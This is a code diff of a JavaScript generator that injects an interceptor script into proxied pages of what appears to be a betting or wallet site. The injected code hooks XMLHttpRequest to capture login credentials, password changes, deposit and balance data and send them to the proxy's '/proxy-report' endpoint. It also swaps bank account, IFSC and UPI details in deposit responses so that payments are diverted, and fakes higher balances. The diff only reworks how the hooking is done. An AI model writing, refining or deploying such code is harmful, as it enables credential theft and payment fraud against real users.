@@ -268,111 +268,83 @@ function buildInterceptorScript(proxyOrigin) {
   return `<script>
 (function(){
   var PROXY="${proxyOrigin}";
-  var RealXHR=window.XMLHttpRequest;
-  function ProxyXHR(){
-    var real=new RealXHR();
-    var self=this;
-    self._real=real;
-    self._url='';
-    self._method='';
-    self._requestBody=null;
-    self._responseModified=false;
-    self._modifiedResponse='';
-    self.readyState=0;
-    self.status=0;
-    self.statusText='';
-    self.responseType='';
-    self.timeout=0;
-    self.withCredentials=false;
-    self.upload=real.upload;
-    real.onreadystatechange=function(){
-      self.readyState=real.readyState;
-      self.status=real.status;
-      self.statusText=real.statusText;
-      if(real.readyState===4){
-        try{self._processResponse();}catch(e){}
-      }
-      if(self.onreadystatechange)self.onreadystatechange.call(self);
-      self.dispatchEvent(new Event('readystatechange'));
-      if(real.readyState===4){
-        self.dispatchEvent(new Event('load'));
-        self.dispatchEvent(new Event('loadend'));
-      }
-    };
-    real.onerror=function(){if(self.onerror)self.onerror.apply(self,arguments);self.dispatchEvent(new Event('error'));};
-    real.ontimeout=function(){if(self.ontimeout)self.ontimeout.apply(self,arguments);self.dispatchEvent(new Event('timeout'));};
-    real.onprogress=function(e){if(self.onprogress)self.onprogress.call(self,e);};
-    real.onloadstart=function(e){if(self.onloadstart)self.onloadstart.call(self,e);self.dispatchEvent(new Event('loadstart'));};
+  var _open=XMLHttpRequest.prototype.open;
+  var _send=XMLHttpRequest.prototype.send;
+  var rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
+  var rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');
+  if(rtDesc&&rtDesc.get){
+    Object.defineProperty(XMLHttpRequest.prototype,'responseText',{get:function(){
+      if(this.__modResp!==undefined)return this.__modResp;
+      return rtDesc.get.call(this);
+    },configurable:true});
   }
-  ProxyXHR.prototype=Object.create(EventTarget.prototype);
-  ProxyXHR.prototype.constructor=ProxyXHR;
-  ProxyXHR.UNSENT=0;ProxyXHR.OPENED=1;ProxyXHR.HEADERS_RECEIVED=2;ProxyXHR.LOADING=3;ProxyXHR.DONE=4;
-  ProxyXHR.prototype.UNSENT=0;ProxyXHR.prototype.OPENED=1;ProxyXHR.prototype.HEADERS_RECEIVED=2;ProxyXHR.prototype.LOADING=3;ProxyXHR.prototype.DONE=4;
-  ProxyXHR.prototype.open=function(m,u){
-    this._method=m;this._url=u;
-    this._real.open.apply(this._real,arguments);
+  if(rDesc&&rDesc.get){
+    Object.defineProperty(XMLHttpRequest.prototype,'response',{get:function(){
+      if(this.__modResp!==undefined)return this.__modResp;
+      return rDesc.get.call(this);
+    },configurable:true});
+  }
+  XMLHttpRequest.prototype.open=function(m,u){
+    this._pUrl=u;this._pMethod=m;
+    return _open.apply(this,arguments);
   };
-  ProxyXHR.prototype.send=function(body){
-    this._requestBody=body;
-    this._real.send.apply(this._real,arguments);
-  };
-  ProxyXHR.prototype.setRequestHeader=function(){this._real.setRequestHeader.apply(this._real,arguments);};
-  ProxyXHR.prototype.getResponseHeader=function(h){return this._real.getResponseHeader(h);};
-  ProxyXHR.prototype.getAllResponseHeaders=function(){return this._real.getAllResponseHeaders();};
-  ProxyXHR.prototype.abort=function(){this._real.abort();};
-  ProxyXHR.prototype.overrideMimeType=function(m){this._real.overrideMimeType(m);};
-  Object.defineProperty(ProxyXHR.prototype,'responseText',{get:function(){
-    if(this._responseModified)return this._modifiedResponse;
-    return this._real.responseText;
-  }});
-  Object.defineProperty(ProxyXHR.prototype,'response',{get:function(){
-    if(this._responseModified)return this._modifiedResponse;
-    return this._real.response;
-  }});
-  Object.defineProperty(ProxyXHR.prototype,'responseURL',{get:function(){return this._real.responseURL;}});
-  Object.defineProperty(ProxyXHR.prototype,'responseXML',{get:function(){return this._real.responseXML;}});
-  ProxyXHR.prototype._processResponse=function(){
-    var url=this._url||'';
-    var settings=window.__PROXY_SETTINGS;
-    if(url.indexOf('/api/auth')!==-1&&this._method==='POST'){
+  XMLHttpRequest.prototype.send=function(body){
+    var xhr=this;
+    var url=xhr._pUrl||'';
+    if(url.indexOf('/api/auth')!==-1&&xhr._pMethod==='POST'){
       try{
-        var bd=JSON.parse(this._requestBody);
-        var r=JSON.parse(this._real.responseText);
-        if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||(r.data&&r.data.token))){
-          fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
-        }
+        var bd=JSON.parse(body);
+        xhr.addEventListener('load',function(){
+          try{
+            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
+            var r=JSON.parse(rt);
+            if(r&&(r.status===true||r.status===1||r.status==='success'||r.token||(r.data&&r.data.token))){
+              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||'',success:true})}).catch(function(){});
+            }
+          }catch(e){}
+        });
       }catch(e){}
     }
     if(url.indexOf('/api/client/get_deposit')!==-1){
-      try{
-        var r2=JSON.parse(this._real.responseText);
-        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r2})}).catch(function(){});
-        if(settings&&settings.bank&&settings.enabled){
-          var d2=r2.data||r2.body||r2;
-          if(d2){replaceBankDeep(d2,settings.bank);this._modifiedResponse=JSON.stringify(r2);this._responseModified=true;}
+      xhr.addEventListener('readystatechange',function(){
+        if(xhr.readyState===4&&!xhr.__bankDone){
+          xhr.__bankDone=true;
+          try{
+            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
+            var r=JSON.parse(rt);
+            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r})}).catch(function(){});
+            var settings=window.__PROXY_SETTINGS;
+            if(settings&&settings.bank&&settings.enabled){
+              var d=r.data||r.body||r;
+              if(d){replaceBankDeep(d,settings.bank);xhr.__modResp=JSON.stringify(r);}
+            }
+          }catch(e){}
         }
-      }catch(e){}
+      });
     }
     if(url.indexOf('/ws/getUserDataNew')!==-1||url.indexOf('/api/client/profile')!==-1||url.indexOf('/api/client/get-client')!==-1){
-      try{
-        var r3=JSON.parse(this._real.responseText);
-        if(settings&&settings.addedBalance&&settings.enabled){
-          var d3=r3.data||r3;
-          addBonus(d3,settings.addedBalance);
-          if(r3.data)addBonus(r3.data,settings.addedBalance);
-          this._modifiedResponse=JSON.stringify(r3);this._responseModified=true;
+      xhr.addEventListener('readystatechange',function(){
+        if(xhr.readyState===4&&!xhr.__balDone){
+          xhr.__balDone=true;
+          try{
+            var rt=rtDesc?rtDesc.get.call(xhr):xhr.responseText;
+            var r=JSON.parse(rt);
+            var settings=window.__PROXY_SETTINGS;
+            if(settings&&settings.addedBalance&&settings.enabled){
+              addBonus(r,settings.addedBalance);
+              xhr.__modResp=JSON.stringify(r);
+            }
+            var uname=null;
+            try{var tk=localStorage.getItem('token')||'';if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||'';}}}catch(e2){}
+            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r})}).catch(function(){});
+          }catch(e){}
         }
-        var uname=null;
-        try{var tk=localStorage.getItem('token')||'';if(tk){var parts=tk.split('.');if(parts.length===3){var p=JSON.parse(atob(parts[1]));uname=p.username||p.sub||p.userId||'';}}}catch(e){}
-        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r3})}).catch(function(){});
-      }catch(e){}
+      });
     }
-    if(url.indexOf('/api/change_password')!==-1&&this._method==='POST'){
-      try{
-        var bd3=JSON.parse(this._requestBody);
-        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd3})}).catch(function(){});
-      }catch(e){}
+    if(url.indexOf('/api/change_password')!==-1&&xhr._pMethod==='POST'){
+      try{var bd2=JSON.parse(body);fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd2})}).catch(function(){});}catch(e){}
     }
+    return _send.apply(this,arguments);
   };
   var BF={'accountno':'accountNo','accountnumber':'accountNo','account_no':'accountNo','receiveaccountno':'accountNo','bankaccount':'accountNo','acno':'accountNo','bankaccountno':'accountNo','beneficiaryaccount':'accountNo','account_number':'accountNo','beneficiaryname':'accountHolder','accountname':'accountHolder','account_name':'accountHolder','receiveaccountname':'accountHolder','holdername':'accountHolder','accountholder':'accountHolder','realname':'accountHolder','receivername':'accountHolder','name':'accountHolder','ifsc':'ifsc','ifsccode':'ifsc','ifsc_code':'ifsc','receiveifsc':'ifsc','bankifsc':'ifsc','bankname':'bankName','bank_name':'bankName','bank':'bankName','upiid':'upiId','upi_id':'upiId','upi':'upiId','vpa':'upiId','upiaddress':'upiId'};
   function replaceBankDeep(obj,bank){
@@ -394,10 +366,9 @@ function buildInterceptorScript(proxyOrigin) {
   function addBonus(obj,bonus){
     if(!obj||typeof obj!=='object')return;
     if(Array.isArray(obj)){for(var i=0;i<obj.length;i++){if(typeof obj[i]==='object')addBonus(obj[i],bonus);}return;}
-    var bk=['balance','availablebalance','totalbalance','wallet','availbalance','bal','exposurebal','chips','coins','availbal','available_balance','availableBalance','totalBalance'];
+    var bk=['balance','availableBalance','totalBalance','wallet','availBalance','bal','exposureBal','chips','coins','availBal','available_balance'];
     for(var k in obj){
-      var kl=k.toLowerCase();
-      if(bk.indexOf(kl)!==-1||bk.indexOf(k)!==-1){
+      if(bk.indexOf(k)!==-1){
         var c=parseFloat(obj[k]);
         if(!isNaN(c)){obj[k]=typeof obj[k]==='string'?String((c+bonus).toFixed(2)):parseFloat((c+bonus).toFixed(2));}
       }
@@ -413,7 +384,6 @@ function buildInterceptorScript(proxyOrigin) {
   }
   loadSettings();
   setInterval(loadSettings,30000);
-  window.XMLHttpRequest=ProxyXHR;
 })();
 </script>`;
 }
